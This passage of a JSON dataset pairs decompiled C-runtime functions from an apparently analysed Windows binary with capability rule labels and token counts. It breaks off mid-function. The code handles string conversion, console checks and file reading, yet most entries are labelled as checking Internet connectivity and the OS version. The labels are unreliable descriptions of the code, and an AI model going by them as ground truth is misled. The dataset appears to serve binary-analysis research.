            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl fcn.004162ea(int32_t arg_8h, uint16_t *arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint16_t *var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    uVar5 = 0;\n    var_20h = arg_8h;\n    var_18h = arg_ch;\n    var_10h = 0;\n    if ((arg_8h != 0) && (arg_10h == 0)) goto code_r0x00416582;\n    if (arg_ch == NULL) {\n        *(arg_14h + 0x1c) = 1;\n        *(arg_14h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_14h);\n        goto code_r0x00416582;\n    }\n    if (*(arg_14h + 0x14) == '\\0') {\n        fcn.0040d4a0();\n    }\n    iVar4 = *(arg_14h + 0xc);\n    var_14h = *(iVar4 + 8);\n    if (var_14h == 0xfde9) {\n        var_28h = 0;\n        var_24h = 0;\n        fcn.00420820(var_20h, &var_18h, arg_10h, &var_28h, arg_14h);\n        goto code_r0x00416582;\n    }\n    var_24h = *(iVar4 + 0xa8);\n    if (var_20h == 0) {\n        if (var_24h == 0) {\n            uVar2 = *var_18h;\n            puVar3 = var_18h;\n            while (uVar2 != 0) {\n                if (0xff < uVar2) goto code_r0x00416574;\n                puVar3 = puVar3 + 1;\n                uVar2 = *puVar3;\n            }\n            goto code_r0x00416582;\n        }\n        iVar4 = fcn.0041aa21(var_14h, 0, var_18h, 0xffffffff, 0, 0, 0, &var_10h);\njoined_r0x00416569:\n        if ((iVar4 != 0) && (var_10h == 0)) goto code_r0x00416582;\n    }\n    else {\n        if (*(iVar4 + 0xa8) == 0) {\n            if (arg_10h != 0) {\n                do {\n                    if (0xff < *var_18h) goto code_r0x00416574;\n                    *(var_20h + uVar5) = *var_18h;\n                    uVar2 = *var_18h;\n                    var_18h = var_18h + 1;\n                } while ((uVar2 != 0) && (uVar5 = uVar5 + 1,  uVar5 < arg_10h));\n            }\n            goto code_r0x00416582;\n        }\n        if (*(iVar4 + 4) == 1) {\n            if (arg_10h != 0) {\n                var_1ch = arg_10h;\n                puVar3 = var_18h;\n                do {\n                    if (*puVar3 == 0) {\n                        arg_10h = (puVar3 - var_18h >> 1) + 1;\n                        break;\n                    }\n                    puVar3 = puVar3 + 1;\n                    var_1ch = var_1ch - 1;\n                } while (var_1ch != 0);\n            }\n            iVar4 = fcn.0041aa21(var_14h, 0, var_18h, arg_10h, var_20h, arg_10h, 0, &var_10h);\n            goto joined_r0x00416569;\n        }\n        var_14h = fcn.0041aa21(var_14h, 0, var_18h, 0xffffffff, var_20h, arg_10h, 0, &var_10h);\n        if (var_10h == 0) {\n            if (var_14h != 0) goto code_r0x00416582;\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar4 == 0x7a) {\n                if (arg_10h != 0) {\n                    do {\n                        iVar4 = *(*(arg_14h + 0xc) + 4);\n                        if (5 < iVar4) {\n                            iVar4 = 5;\n                        }\n                        var_24h = fcn.0041aa21(*(*(arg_14h + 0xc) + 8), 0, var_18h, 1, &var_ch, iVar4, 0, &var_10h);\n                        if ((((var_24h == 0) || (var_10h != 0)) || (var_24h < 0)) || (5 < var_24h))\n                        goto code_r0x00416574;\n                        if (arg_10h < var_24h + var_14h) break;\n                        var_1ch = 0;\n                        if (0 < var_24h) {\n                            do {\n                                cVar1 = *(&var_ch + var_1ch);\n                                *(var_20h + var_14h) = cVar1;\n                                if (cVar1 == '\\0') goto code_r0x00416582;\n                                var_1ch = var_1ch + 1;\n                                var_14h = var_14h + 1;\n                            } while (var_1ch < var_24h);\n                        }\n                        var_18h = var_18h + 1;\n                    } while (var_14h < arg_10h);\n                }\n                goto code_r0x00416582;\n            }\n        }\n    }\ncode_r0x00416574:\n    *(arg_14h + 0x18) = 0x2a;\n    *(arg_14h + 0x1c) = 1;\ncode_r0x00416582:\n    fcn.00406dcc(var_28h);\n    return;\n}\n",
        "token_count": 1543
    },
    "0041669a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041669a(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *arg_10h_00;\n    uint *puVar3;\n    uint var_28h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040f75f(arg_8h);\n    arg_8h_00 = *(var_18h + 8);\n    puVar3 = &stack0xffffffc0;\n    arg_10h_00 = &stack0xffffffc0;\n    iVar1 = fcn.00415ccd(arg_ch, arg_10h, 0, 0);\n    if (iVar1 == 0) goto code_r0x0041675d;\n    uVar2 = iVar1 * 2 + 8;\n    uVar2 = -(iVar1 * 2 < uVar2) & uVar2;\n    if (uVar2 == 0) {\n        arg_10h_00 = NULL;\n    }\n    else {\n        if (uVar2 < 0x401) {\n            fcn.00407370();\n            if (*0x10 != 0x40) {\ncode_r0x00416717:\n                arg_10h_00 = puVar3 + 2;\n            }\n        }\n        else {\n            arg_10h_00 = fcn.00414556(uVar2);\n            if (arg_10h_00 != NULL) {\n                *arg_10h_00 = 0xdddd;\n                puVar3 = arg_10h_00;\n                goto code_r0x00416717;\n            }\n        }\n        if ((arg_10h_00 != NULL) && (iVar1 = fcn.00415ccd(arg_ch, arg_10h, arg_10h_00, iVar1),  iVar1 != 0)) {\n            fcn.0041aa21(arg_8h_00, 0, arg_10h_00, 0xffffffff, -(arg_18h != 0) & arg_14h, arg_18h, 0, 0);\n        }\n    }\n    fcn.00406c2b(arg_10h_00);\ncode_r0x0041675d:\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    fcn.00406dcc(var_1ch);\n    return;\n}\n",
        "token_count": 669
    },
    "00416931": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00416931(uint arg_8h, uint dwInfoType, uint arg_10h, uint arg_14h, uint lpCharType, int32_t arg_1ch, int32_t arg_20h\n            )\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t arg_8h_00;\n    uint *lpWideCharStr;\n    uint *puVar3;\n    uint var_28h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &stack0xffffffd0;\n    lpWideCharStr = &stack0xffffffd0;\n    fcn.0040f75f(arg_8h);\n    if (arg_1ch == 0) {\n        arg_1ch = *(var_18h + 8);\n    }\n    iVar2 = fcn.0041a9a5(arg_1ch, (arg_20h != 0) * 8 + 1, arg_10h, arg_14h, 0, 0);\n    if (iVar2 == 0) goto code_r0x00416a16;\n    uVar1 = iVar2 * 2;\n    arg_8h_00 = -(uVar1 < uVar1 + 8) & uVar1 + 8;\n    if (arg_8h_00 == 0) {\n        lpWideCharStr = NULL;\n    }\n    else {\n        if (arg_8h_00 < 0x401) {\n            fcn.00407370();\n            if (*0x10 != 0x30) {\ncode_r0x004169c9:\n                lpWideCharStr = puVar3 + 2;\n            }\n        }\n        else {\n            lpWideCharStr = fcn.00414556(arg_8h_00);\n            if (lpWideCharStr != NULL) {\n                *lpWideCharStr = 0xdddd;\n                puVar3 = lpWideCharStr;\n                goto code_r0x004169c9;\n            }\n        }\n        if (lpWideCharStr != NULL) {\n            fcn.004085e0(lpWideCharStr, 0, uVar1);\n            iVar2 = fcn.0041a9a5(arg_1ch, 1, arg_10h, arg_14h, lpWideCharStr, iVar2);\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetStringTypeW)(dwInfoType, lpWideCharStr, iVar2, lpCharType);\n            }\n        }\n    }\n    fcn.00406c2b(lpWideCharStr);\ncode_r0x00416a16:\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    fcn.00406dcc(var_1ch);\n    return;\n}\n",
        "token_count": 727
    },
    "00417528": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417528(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lpMode;\n    \n    iVar1 = fcn.004206ab(arg_8h);\n    if (iVar1 != 0) {\n        iVar2 = arg_8h >> 6;\n        iVar1 = (arg_8h & 0x3f) * 0x38;\n        if (*(*(iVar2 * 4 + 0x48fb00) + 0x28 + iVar1) < '\\0') {\n            if (*(arg_ch + 0x14) == '\\0') {\n                fcn.0040d4a0();\n            }\n            if (((*(*(arg_ch + 0xc) + 0xa8) != 0) || (*(*(iVar2 * 4 + 0x48fb00) + 0x29 + iVar1) != '\\0')) &&\n               (iVar1 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(*(*(iVar2 * 4 + 0x48fb00) + 0x18 + iVar1), &lpMode), \n               iVar1 != 0)) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 286
    },
    "00417dcd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417dcd(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    uint32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_10h;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_ch);\n        return -1;\n    }\n    arg_8h_00 = fcn.00415447(arg_8h);\n    if (arg_8h[2] < 0) {\n        arg_8h[2] = 0;\n    }\n    iVar6 = fcn.00419124(arg_8h_00, 0, 0, 1, arg_ch);\n    arg_10h = iVar6 >> 0x20;\n    iVar4 = iVar6;\n    if ((iVar6 < 0x100000000) && (iVar6 < 0)) {\ncode_r0x00417f14:\n        iVar3 = -1;\n    }\n    else {\n        if ((arg_8h[3] & 0xc0U) == 0) {\n            return iVar4 - arg_8h[2];\n        }\n        iVar3 = arg_8h_00 >> 6;\n        iVar5 = (arg_8h_00 & 0x3f) * 0x38;\n        uVar1 = *(iVar5 + 0x29 + *(iVar3 * 4 + 0x48fb00));\n        var_8h = var_8h & 0xffffff00 | uVar1;\n        iVar2 = *arg_8h - arg_8h[1];\n        if ((arg_8h[3] & 3U) == 0) {\n            if ((arg_8h[3] >> 2 & 1) == 0) {\n                *(arg_ch + 0x1c) = 1;\n                *(arg_ch + 0x18) = 0x16;\n                goto code_r0x00417f14;\n            }\n        }\n        else {\n            if ((uVar1 == 1) && ((*(iVar5 + 0x2d + *(iVar3 * 4 + 0x48fb00)) & 2) != 0)) {\n                iVar4 = fcn.0041812d(arg_8h, iVar4, arg_10h, arg_ch);\n                return iVar4;\n            }\n            if (*(iVar5 + 0x28 + *(iVar3 * 4 + 0x48fb00)) < '\\0') {\n                iVar7 = fcn.004182d8(arg_8h[1], *arg_8h, var_8h);\n                iVar2 = iVar7 + iVar2;\n            }\n        }\n        iVar3 = iVar2;\n        if (iVar6 != 0) {\n            if ((arg_8h[3] & 1U) == 0) {\n                if (uVar1 == 1) {\n                    iVar3 = fcn.00422f70(iVar2, 2, 0);\n                }\n                iVar3 = iVar3 + iVar4;\n            }\n            else {\n                iVar3 = fcn.00417f6e(arg_8h, iVar4, arg_10h, iVar3, iVar2 >> 0x20, arg_ch);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 877
    },
    "0041812d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041812d(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    int32_t iVar5;\n    bool bVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    uint var_101ch;\n    uint var_1018h;\n    uint32_t lpNumberOfBytesRead;\n    uint var_1010h;\n    uint var_100ch;\n    uint32_t var_1008h;\n    uint lpBuffer;\n    uint uStackY56;\n    uint in_stack_ffffffec;\n    uint var_4h;\n    \n    fcn.00407b60();\n    uVar1 = fcn.00415447(arg_8h);\n    if (*(arg_8h + 8) != 0) {\n        in_stack_ffffffec = 0;\n        iVar7 = fcn.00422f70();\n        iVar4 = iVar7 >> 0x20;\n        var_1008h = iVar7;\n        iVar5 = (uVar1 & 0x3f) * 0x38;\n        iVar2 = *((uVar1 >> 6) * 4 + 0x48fb00);\n        uStackY56 = 0x4181b8;\n        uVar8 = fcn.00419124(uVar1, *(iVar5 + 0x20 + iVar2), *(iVar5 + 0x24 + iVar2), 0, arg_14h);\n        iVar2 = *((uVar1 >> 6) * 4 + 0x48fb00);\n        if ((uVar8 == *(iVar5 + 0x20 + iVar2)) && (uVar8 >> 0x20 == *(iVar5 + 0x24 + iVar2))) {\n            uStackY56 = 0x418209;\n            iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)();\n            if (iVar2 != 0) {\n                uStackY56 = 0x418225;\n                fcn.00419124(uVar1, arg_ch, arg_10h, 0, arg_14h);\n                if (((-1 < extraout_EDX) && (iVar7 < 0x100000000)) &&\n                   ((iVar7 < 0 || (var_1008h <= lpNumberOfBytesRead)))) {\n                    iVar2 = 0;\n                    puVar3 = &fcn.0041812d::lpBuffer;\n                    uVar1 = 0;\n                    if ((var_1008h != 0) || (iVar4 != 0)) {\n                        do {\n                            if (&fcn.0041812d::lpBuffer + lpNumberOfBytesRead <= puVar3) break;\n                            if (*puVar3 == 0xd) {\n                                if ((puVar3 < &fcn.0041812d::var_1008h + lpNumberOfBytesRead + 3) &&\n                                   (*(puVar3 + 1) == 10)) {\n                                    puVar3 = puVar3 + 1;\n                                }\n                            }\n                            else {\n                                puVar3 = puVar3 + *(*puVar3 + 0x48e4c8);\n                            }\n                            bVar6 = 0xfffffffe < uVar1;\n                            uVar1 = uVar1 + 1;\n                            iVar2 = iVar2 + bVar6;\n                            puVar3 = puVar3 + 1;\n                        } while ((uVar1 != var_1008h) || (iVar2 != iVar4));\n                    }\n                }\n            }\n        }\n    }\n    fcn.00406dcc(in_stack_ffffffec);\n    return;\n}\n",
        "token_count": 847
    },
    "004182d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004182d8(int16_t *arg_8h, int16_t *arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    if ((arg_10h != '\\x01') && (arg_10h != '\\x02')) {\n        uVar1 = 0;\n        iVar2 = 0;\n        for (; arg_8h != arg_ch; arg_8h = arg_8h + 1) {\n            if (*arg_8h == '\\n') {\n                bVar3 = 0xfffffffe < uVar1;\n                uVar1 = uVar1 + 1;\n                iVar2 = iVar2 + bVar3;\n            }\n        }\n        return CONCAT44(iVar2, uVar1);\n    }\n    uVar1 = 0;\n    iVar2 = 0;\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 1) {\n        if (*arg_8h == 10) {\n            bVar3 = 0xfffffffe < uVar1;\n            uVar1 = uVar1 + 1;\n            iVar2 = iVar2 + bVar3;\n        }\n    }\n    return CONCAT44(iVar2 << 1 | uVar1 >> 0x1f, uVar1 * 2);\n}\n",
        "token_count": 309
    },
    "004185c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004185c2(uint32_t arg_8h, char *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    uint hFile;\n    uint var_10h;\n    char *lpNumberOfBytesRead;\n    char *var_8h;\n    uint lpBuffer;\n    \n    iVar6 = arg_8h >> 6;\n    iVar10 = (arg_8h & 0x3f) * 0x38;\n    iVar5 = *(iVar6 * 4 + 0x48fb00);\n    uVar4 = *(iVar5 + 0x18 + iVar10);\n    if ((arg_10h == 0) || (*arg_ch != '\\n')) {\n        puVar1 = iVar5 + 0x28 + iVar10;\n        *puVar1 = *puVar1 & 0xfb;\n    }\n    else {\n        puVar1 = iVar5 + 0x28 + iVar10;\n        *puVar1 = *puVar1 | 4;\n    }\n    lpNumberOfBytesRead = arg_ch + arg_10h;\n    pcVar7 = arg_ch;\n    pcVar9 = arg_ch;\n    pcVar8 = arg_ch;\n    if (arg_ch < lpNumberOfBytesRead) {\n        do {\n            cVar2 = *pcVar7;\n            pcVar9 = pcVar8;\n            if (cVar2 == '\\x1a') {\n                iVar5 = *(iVar6 * 4 + 0x48fb00);\n                uVar3 = *(iVar5 + 0x28 + iVar10);\n                if ((uVar3 & 0x40) == 0) {\n                    *(iVar5 + 0x28 + iVar10) = uVar3 | 2;\n                }\n                else {\n                    *pcVar8 = '\\x1a';\ncode_r0x00418704:\n                    pcVar9 = pcVar8 + 1;\n                }\n                break;\n            }\n            var_8h = pcVar7 + 1;\n            if (cVar2 == '\\r') {\n                if (lpNumberOfBytesRead <= var_8h) {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(uVar4, &lpBuffer, 1, &lpNumberOfBytesRead, 0);\n                    if ((iVar5 != 0) && (lpNumberOfBytesRead != NULL)) {\n                        if ((*(*(iVar6 * 4 + 0x48fb00) + 0x28 + iVar10) & 0x48) != 0) {\n                            pcVar9 = pcVar8 + 1;\n                            if (lpBuffer == '\\n') {\n                                *pcVar8 = '\\n';\n                            }\n                            else {\n                                *pcVar8 = '\\r';\n                                *(*(iVar6 * 4 + 0x48fb00) + 0x2a + iVar10) = lpBuffer;\n                            }\n                            break;\n                        }\n                        if ((lpBuffer == '\\n') && (pcVar8 == arg_ch)) {\n                            *pcVar8 = '\\n';\n                            goto code_r0x00418704;\n                        }\n                        fcn.00419142(arg_8h, 0xffffffff, 0xffffffff, 1);\n                        if (lpBuffer == '\\n') break;\n                    }\n                    *pcVar8 = '\\r';\n                    goto code_r0x00418704;\n                }\n                cVar2 = *var_8h;\n                var_8h = pcVar7 + (cVar2 == '\\n') + 1;\n                *pcVar8 = ((cVar2 == '\\n') - 1U & 3) + 10;\n            }\n            else {\n                *pcVar8 = cVar2;\n            }\n            pcVar9 = pcVar8 + 1;\n            pcVar7 = var_8h;\n            pcVar8 = pcVar9;\n        } while (var_8h < lpNumberOfBytesRead);\n    }\n    return pcVar9 - arg_ch;\n}\n",
        "token_count": 963
    },
    "0041870e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041870e(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    uint16_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    int32_t iVar9;\n    uint16_t uVar10;\n    uint hFile;\n    int32_t lpNumberOfBytesRead;\n    uint32_t var_10h;\n    uint var_ch;\n    uint16_t *var_8h;\n    uint16_t *lpBuffer;\n    \n    iVar6 = arg_8h >> 6;\n    iVar9 = (arg_8h & 0x3f) * 0x38;\n    iVar5 = *(iVar6 * 4 + 0x48fb00);\n    lpNumberOfBytesRead = 10;\n    uVar3 = *(iVar9 + 0x18 + iVar5);\n    if ((arg_10h == 0) || (*arg_ch != 10)) {\n        puVar1 = iVar9 + 0x28 + iVar5;\n        *puVar1 = *puVar1 & 0xfb;\n    }\n    else {\n        puVar1 = iVar9 + 0x28 + iVar5;\n        *puVar1 = *puVar1 | 4;\n    }\n    var_8h = arg_ch + arg_10h;\n    lpBuffer = arg_ch;\n    puVar8 = arg_ch;\n    if (arg_ch < var_8h) {\n        var_ch = 0xd;\n        puVar7 = arg_ch;\n        do {\n            uVar10 = *lpBuffer;\n            var_10h = uVar10;\n            puVar8 = puVar7;\n            if (uVar10 == 0x1a) {\n                iVar5 = *(iVar6 * 4 + 0x48fb00);\n                uVar2 = *(iVar5 + 0x28 + iVar9);\n                if ((uVar2 & 0x40) == 0) {\n                    *(iVar5 + 0x28 + iVar9) = uVar2 | 2;\n                }\n                else {\n                    uVar10 = 0x1a;\ncode_r0x004188a2:\n                    *puVar7 = uVar10;\ncode_r0x004188a6:\n                    puVar8 = puVar7 + 1;\n                }\n                break;\n            }\n            puVar4 = lpBuffer + 1;\n            if (uVar10 == 0xd) {\n                if (var_8h <= puVar4) {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(uVar3, &lpBuffer, 2, &lpNumberOfBytesRead, 0);\n                    if ((iVar5 == 0) || (lpNumberOfBytesRead == 0)) {\ncode_r0x00418885:\n                        uVar10 = 0xd;\n                        goto code_r0x004188a2;\n                    }\n                    if ((*(iVar9 + 0x28 + *(iVar6 * 4 + 0x48fb00)) & 0x48) == 0) {\n                        if ((lpBuffer == 10) && (puVar7 == arg_ch)) {\n                            *puVar7 = 10;\n                            goto code_r0x004188a6;\n                        }\n                        fcn.00419142(arg_8h, 0xfffffffe, 0xffffffff, 1);\n                        if (lpBuffer != 10) goto code_r0x00418885;\n                    }\n                    else {\n                        puVar8 = puVar7 + 1;\n                        if (lpBuffer == 10) {\n                            *puVar7 = 10;\n                        }\n                        else {\n                            *puVar7 = 0xd;\n                            *(iVar9 + 0x2a + *(iVar6 * 4 + 0x48fb00)) = lpBuffer;\n                            *(iVar9 + 0x2b + *(iVar6 * 4 + 0x48fb00)) = lpBuffer >> 8;\n                            *(iVar9 + 0x2c + *(iVar6 * 4 + 0x48fb00)) = 10;\n                        }\n                    }\n                    break;\n                }\n                uVar10 = *puVar4;\n                puVar4 = lpBuffer + (uVar10 == 10) + 1;\n                *puVar7 = ((uVar10 == 10) - 1 & 3) + 10;\n            }\n            else {\n                *puVar7 = uVar10;\n            }\n            puVar8 = puVar7 + 1;\n            puVar7 = puVar8;\n            lpBuffer = puVar4;\n        } while (puVar4 < var_8h);\n    }\n    return puVar8 - arg_ch & 0xfffffffe;\n}\n",
        "token_count": 1099
    },
    "00418b9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00418b9c(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *arg_8h_00;\n    int32_t iVar7;\n    uint32_t uVar8;\n    ulong uVar9;\n    uint lpMode;\n    char *var_20h;\n    uint32_t var_1ch;\n    uint hConsoleHandle;\n    uint32_t lpNumberOfBytesRead;\n    int32_t var_10h;\n    char *lpBuffer;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar2 = fcn.0040e0db();\n        *puVar2 = 0;\n        puVar2 = fcn.0040e0ee();\n        *puVar2 = 9;\n        return 0xffffffff;\n    }\n    if ((-1 < arg_8h) && (arg_8h < *0x48fd00)) {\n        var_8h = arg_8h >> 6;\n        iVar7 = (arg_8h & 0x3f) * 0x38;\n        var_1ch = 1;\n        lpNumberOfBytesRead = *(var_8h * 4 + 0x48fb00);\n        var_1h._0_1_ = *(lpNumberOfBytesRead + 0x28 + iVar7);\n        var_10h = iVar7;\n        if ((var_1h & 1) != 0) {\n            if (arg_10h < 0x80000000) {\n                if ((arg_10h == 0) || ((var_1h & 2) != 0)) {\n                    return 0;\n                }\n                if (arg_ch != NULL) {\n                    hConsoleHandle = *(lpNumberOfBytesRead + 0x18 + iVar7);\n                    var_1h._0_1_ = *(lpNumberOfBytesRead + 0x29 + iVar7);\n                    arg_8h_00 = NULL;\n                    if (var_1h == '\\x01') {\n                        if ((~arg_10h & 1) == 0) {\ncode_r0x00418c7a:\n                            puVar2 = fcn.0040e0db();\n                            *puVar2 = 0;\n                            puVar2 = fcn.0040e0ee();\n                            *puVar2 = 0x16;\n                            fcn.0040b81f();\n                            pcVar3 = arg_8h_00;\n                        }\n                        else {\n                            uVar8 = 4;\n                            if (3 < arg_10h >> 1) {\n                                uVar8 = arg_10h >> 1;\n                            }\n                            pcVar3 = fcn.00414556(uVar8);\n                            fcn.0041451c(0);\n                            fcn.0041451c(0);\n                            lpBuffer = pcVar3;\n                            if (pcVar3 != NULL) {\n                                uVar9 = fcn.00419142(arg_8h, 0, 0, 1);\n                                iVar4 = *(var_8h * 4 + 0x48fb00);\n                                *(iVar7 + 0x20 + iVar4) = uVar9;\n                                *(iVar7 + 0x24 + iVar4) = uVar9 >> 0x20;\n                                lpNumberOfBytesRead = *(var_8h * 4 + 0x48fb00);\n                                arg_8h_00 = pcVar3;\n                                goto code_r0x00418d23;\n                            }\n                            puVar2 = fcn.0040e0ee();\n                            *puVar2 = 0xc;\n                            puVar2 = fcn.0040e0db();\n                            *puVar2 = 8;\n                        }\ncode_r0x00418e4f:\n                        uVar8 = 0xffffffff;\n                        arg_8h_00 = pcVar3;\n                    }\n                    else {\n                        pcVar3 = arg_ch;\n                        uVar8 = arg_10h;\n                        if (var_1h == '\\x02') {\n                            if ((~arg_10h & 1) == 0) goto code_r0x00418c7a;\n                            lpBuffer = arg_ch;\n                        }\n                        else {\n                            lpBuffer = arg_ch;\n                        }\ncode_r0x00418d23:\n                        iVar7 = 0;\n                        uVar6 = uVar8;\n                        pcVar5 = lpBuffer;\n                        if ((((*(var_10h + 0x28 + lpNumberOfBytesRead) & 0x48) != 0) &&\n                            (cVar1 = *(var_10h + 0x2a + lpNumberOfBytesRead),  cVar1 != '\\n')) && (uVar8 != 0)) {\n                            iVar7 = 1;\n                            *lpBuffer = cVar1;\n                            pcVar5 = lpBuffer + 1;\n                            uVar6 = uVar8 - 1;\n                            *(var_10h + 0x2a + *(var_8h * 4 + 0x48fb00)) = 10;\n                            if (((var_1h != '\\0') &&\n                                (cVar1 = *(var_10h + 0x2b + *(var_8h * 4 + 0x48fb00)),  cVar1 != '\\n')) && (uVar6 != 0))\n                            {\n                                *pcVar5 = cVar1;\n                                pcVar5 = lpBuffer + 2;\n                                uVar6 = 